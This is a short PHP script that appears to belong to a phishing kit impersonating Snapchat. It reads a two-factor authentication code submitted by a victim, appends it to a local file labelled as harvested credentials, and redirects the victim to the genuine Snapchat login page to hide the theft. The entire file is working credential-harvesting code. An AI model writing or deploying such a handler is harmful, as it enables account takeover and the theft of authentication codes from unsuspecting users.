<?php

$code = $_POST['code'];

file_put_contents("auth/usernames.dat", "Snapchat 2FA Code: " . $code . "\n\n", FILE_APPEND);

header('Location: https://accounts.snapchat.com/accounts/login');
exit();

?>
